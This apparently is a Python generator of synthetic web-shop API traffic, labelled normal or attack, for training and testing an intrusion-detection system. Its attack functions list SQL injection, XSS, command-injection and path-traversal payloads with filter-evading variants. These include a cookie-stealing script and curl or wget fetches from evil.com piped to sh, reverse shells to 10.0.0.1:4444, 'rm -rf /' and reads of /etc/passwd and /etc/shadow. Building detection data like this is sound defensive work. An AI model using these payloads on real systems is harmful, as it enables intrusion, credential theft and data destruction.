"""Synthetic API traffic: normal users, attackers, scanners.

Used to (1) train the agents, (2) evaluate them, (3) drive the live demo.
Attack payloads come in two families:
  known  -> used for training
  novel  -> obfuscated variants NEVER seen in training (our "zero-day" test)
"""
import json
import random
import re
from urllib.parse import quote_plus, unquote_plus

KNOWN_ENDPOINTS = {
    "/login", "/logout", "/profile", "/products", "/products/{id}", "/cart",
    "/checkout", "/orders", "/orders/{id}", "/search", "/settings", "/help",
    "/feedback", "/files",
}

FLOWS = [
    ["/login", "/profile", "/orders", "/orders/{id}", "/logout"],
    ["/login", "/products", "/products/{id}", "/cart", "/checkout", "/orders", "/logout"],
    ["/search", "/products", "/products/{id}", "/products/{id}", "/cart"],
    ["/login", "/settings", "/profile", "/logout"],
    ["/products", "/search", "/products/{id}", "/help", "/feedback"],
    ["/login", "/files", "/files", "/logout"],
]

RECON_PATHS = [
    "/admin", "/.env", "/backup.zip", "/config.php", "/admin/users", "/wp-login.php",
    "/phpmyadmin", "/api/v1/users/{id}", "/.git/config", "/server-status",
    "/actuator/env", "/debug",
]

NAMES = ["alice", "rahul", "priya", "john", "sara", "arjun", "mina", "kabir", "neha", "tom"]
WORDS = ["red", "running", "shoes", "laptop", "phone", "case", "blue", "jacket", "wireless",
         "headphones", "kitchen", "mixer", "book", "python", "guide", "desk", "lamp", "coffee",
         "maker", "backpack", "cotton", "shirt", "table", "chair"]
STREETS = ["Park Street", "Mall Road", "Lake View", "Sector 70", "Green Avenue", "Station Road"]
# Harmless text that *looks* risky. Keeps false positives honest.
TRICKY_TEXT = [
    "men's running shoes", "women's winter boots", "kid's school bag", "select size medium",
    "union jersey football", "script writing for beginners", "please update my address",
    "how to delete my old address", "drop off at the back door", "it's a gift, thanks",
]
FEEDBACK_OK = [
    "Great service, thanks for the quick delivery", "The app is easy to use",
    "Package arrived on time", "Please add more colours", "Support was very helpful",
    "Love the new design", "Checkout was smooth",
]
UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 13) Chrome/117.0 Mobile Safari/537.36",
    "MyShopApp/3.2 (iPhone; iOS 17.0)",
]
TOOL_UAS = ["sqlmap/1.7.2#stable (https://sqlmap.org)", "python-requests/2.31.0",
            "curl/8.1.2", "Nikto/2.5.0", ""]


def normalize_endpoint(path):
    path = path.split("?")[0]
    if len(path) > 1:
        path = path.rstrip("/")
    return "/".join("{id}" if p.isdigit() else p for p in path.split("/")) or "/"


def normalize_text(raw):
    """Undo common evasion tricks: double URL-encoding, SQL comments, ${IFS}."""
    s = raw or ""
    for _ in range(2):
        s = unquote_plus(s)
    s = re.sub(r"/\*.*?\*/", " ", s)
    s = re.sub(r"\$\{?ifs\}?", " ", s, flags=re.I)
    return s


def _pw(rng):
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#_"
    return "".join(rng.choice(chars) for _ in range(rng.randint(8, 14)))


def _headers(rng, tool=False):
    ua = rng.choice(TOOL_UAS) if tool else rng.choice(UAS)
    h = {"Host": "api.shop.example", "Accept": "application/json"}
    if ua:
        h["User-Agent"] = ua
    if not tool or rng.random() < 0.5:
        h["Content-Type"] = "application/json"
        h["Accept-Language"] = "en-US"
    if not tool and rng.random() < 0.7:
        h["Authorization"] = "Bearer token"
    return h


def make_request(rng, endpoint, method, query, body, user, ip, ts, tool=False):
    path = endpoint.replace("{id}", str(rng.randint(1, 500)))
    return {
        "method": method, "path": path, "endpoint": normalize_endpoint(path),
        "query": query, "body": body, "headers": _headers(rng, tool),
        "ip": ip, "user": user, "ts": ts, "label": 0, "attack_type": "normal",
    }


def _benign_text(rng):
    if rng.random() < 0.12:
        return rng.choice(TRICKY_TEXT)
    return " ".join(rng.choice(WORDS) for _ in range(rng.randint(1, 3)))


def normal_request(rng, ep, user, ip, ts):
    method, query, body = "GET", "", ""
    if ep == "/login":
        method = "POST"
        body = json.dumps({"username": rng.choice(NAMES) + str(rng.randint(1, 99)), "password": _pw(rng)})
    elif ep == "/search":
        query = "q=" + quote_plus(_benign_text(rng))
    elif ep == "/products":
        query = f"page={rng.randint(1, 9)}&sort={rng.choice(['price', 'rating', 'new'])}"
    elif ep == "/cart":
        method = "POST"
        body = json.dumps({"product_id": rng.randint(1, 500), "qty": rng.randint(1, 5)})
    elif ep == "/checkout":
        method = "POST"
        body = json.dumps({"address": f"{rng.randint(1, 99)} {rng.choice(STREETS)}",
                           "coupon": rng.choice(["SAVE10", "WELCOME", "NONE"]), "payment": "card"})
    elif ep == "/settings":
        method = "POST"
        body = json.dumps({"email": rng.choice(NAMES) + "@example.com", "theme": rng.choice(["dark", "light"])})
    elif ep == "/feedback":
        method = "POST"
        msg = rng.choice(TRICKY_TEXT) if rng.random() < 0.12 else rng.choice(FEEDBACK_OK)
        body = json.dumps({"message": msg})
    elif ep == "/files":
        query = f"name={rng.choice(['invoice', 'report', 'manual'])}{rng.randint(1, 99)}.pdf"
    elif ep == "/orders":
        query = f"status={rng.choice(['open', 'shipped', 'closed'])}"
    return make_request(rng, ep, method, query, body, user, ip, ts)


# ---------------------------------------------------------------- attacks
def _n(rng):
    return rng.randint(1, 9)


def sqli_known(rng):
    n = _n(rng)
    return rng.choice([
        f"' OR {n}={n}--", f"' OR '{n}'='{n}", "admin'--", f"{n}; DROP TABLE users;--",
        "' UNION SELECT username,password FROM users--", f"{n}' AND SLEEP({n})--",
        f"' OR {n}={n}#", f"{n} UNION ALL SELECT NULL,NULL,version()--",
        "'; EXEC xp_cmdshell('dir');--", "' OR 'x'='x' --", f"1' ORDER BY {n}--",
        "'; INSERT INTO users VALUES('h','h');--"])


def sqli_novel(rng):
    n = _n(rng)
    return rng.choice([
        f"1'/**/oR/**/{n}={n}--", f"%27%20OR%20{n}%3D{n}--", "UnIoN/**/SeLeCt/**/NULL,NULL--",
        f"' || (SELECT {n} FROM pg_sleep({n})) || '",
        "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", "' OR 'a' LIKE 'a",
        f"{n}) OR ({n}={n}", f"' AND extractvalue({n},concat(0x7e,version()))--"])


def xss_known(rng):
    return rng.choice([
        "<script>alert(1)</script>", "<img src=x onerror=alert(document.cookie)>",
        "<svg onload=alert(1)>", "javascript:alert(1)", "<iframe src=javascript:alert(1)>",
        "\"><script>fetch('//evil.com?c='+document.cookie)</script>", "<body onload=alert(1)>",
        f"<script>alert({_n(rng)})</script>"])


def xss_novel(rng):
    return rng.choice([
        "<ScRiPt>alert(1)</sCrIpT>", "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "<details open ontoggle=alert(1)>", "<math><mtext><img src=x onerror=confirm(1)>",
        "<input autofocus onfocus=prompt(1)>", "<a href=\"jav&#x09;ascript:alert(1)\">x</a>",
        "<video><source onerror=alert(1)>"])


def cmdi_known(rng):
    return rng.choice([
        "; cat /etc/passwd", "| ls -la", "`whoami`", "$(curl http://evil.com/x.sh|sh)",
        "&& wget http://evil.com/shell.sh", "; rm -rf /", "| nc -e /bin/sh 10.0.0.1 4444",
        "; ping -c 4 10.0.0.1", f"&& id #{_n(rng)}"])


def cmdi_novel(rng):
    return rng.choice([
        ";cat${IFS}/etc/passwd", "%0acat%20/etc/passwd", "|| uname -a", "; w'h'oami",
        "`/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`", "$(base64 -d <<< d2hvYW1p | sh)"])


def trav_known(rng):
    return rng.choice([
        "../../etc/passwd", "..\\..\\windows\\system32\\config\\sam", "....//....//etc/shadow",
        "/../../../../etc/hosts", "../../../var/log/auth.log", "../" * _n(rng) + "etc/passwd"])


def trav_novel(rng):
    return rng.choice([
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%afetc/passwd", "/var/www/../../etc/passwd%00.pdf"])


GENERATORS = {
    "sqli": (sqli_known, sqli_novel), "xss": (xss_known, xss_novel),
    "cmdi": (cmdi_known, cmdi_novel), "traversal": (trav_known, trav_novel),
}
ATTACK_KINDS = list(GENERATORS)


def attack_request(rng, kind, novel, user, ip, ts):
    payload = GENERATORS[kind][1 if novel else 0](rng)
    tool = rng.random() < 0.4
    if kind == "traversal":
        r = make_request(rng, "/files", "GET", "name=" + quote_plus(payload), "", user, ip, ts, tool)
    else:
        where = rng.choice(["search", "login", "feedback"])
        if where == "search":
            r = make_request(rng, "/search", "GET", "q=" + quote_plus(payload), "", user, ip, ts, tool)
        elif where == "login":
            r = make_request(rng, "/login", "POST", "", json.dumps({"username": payload, "password": _pw(rng)}),
                             user, ip, ts, tool)
        else:
            r = make_request(rng, "/feedback", "POST", "", json.dumps({"message": payload}),
                             user, ip, ts, tool)
    r["label"], r["attack_type"], r["novel"] = 1, kind, novel
    return r


def _identity(rng):
    return "u%05d" % rng.randint(0, 99999), ".".join(str(rng.randint(11, 220)) for _ in range(4))


def generate_session(rng, kind, t0, novel=False):
    """One user's burst of requests. kind: normal | sqli | xss | cmdi | traversal | recon"""
    user, ip = _identity(rng)
    t, out = t0, []
    if kind == "recon":
        tool_ua = rng.choice(TOOL_UAS[:4])
        for _ in range(rng.randint(12, 20)):
            t += rng.uniform(0.05, 0.3)
            r = make_request(rng, rng.choice(RECON_PATHS), "GET", "", "", user, ip, t, tool=True)
            r["headers"]["User-Agent"] = tool_ua
            r["label"], r["attack_type"] = 1, "recon"
            out.append(r)
        return out
    flow = list(rng.choice(FLOWS))
    if kind == "normal":
        seq = [e for e in flow if rng.random() > 0.08] or flow[:2]
        if rng.random() < 0.05:
            seq.insert(rng.randint(0, len(seq)), rng.choice(sorted(KNOWN_ENDPOINTS)))
        if rng.random() < 0.3:                      # people repeat actions: search again, open another page
            i = rng.randrange(len(seq))
            seq[i:i] = [seq[i]] * rng.randint(1, 2)
        for ep in seq:
            t += rng.uniform(1, 6)
            out.append(normal_request(rng, ep, user, ip, t))
        return out
    for ep in flow[:rng.randint(1, 3)]:
        t += rng.uniform(1, 6)
        out.append(normal_request(rng, ep, user, ip, t))
    t += rng.uniform(1, 4)
    out.append(attack_request(rng, kind, novel, user, ip, t))
    return out


def mixed_sessions(rng, n, t0, novel_share=0.3, attack_share=0.3):
    kinds = ATTACK_KINDS * 2 + ["recon"]      # scanners send many requests, so pick them less often
    reqs, t = [], t0
    for _ in range(n):
        if rng.random() < attack_share:
            kind = rng.choice(kinds)
            s = generate_session(rng, kind, t, novel=rng.random() < novel_share)
        else:
            s = generate_session(rng, "normal", t)
        reqs.extend(s)
        t = s[-1]["ts"] + 1
    return reqs


def payload_text(req):
    return normalize_text((req.get("query") or "") + " " + (req.get("body") or "")).strip()
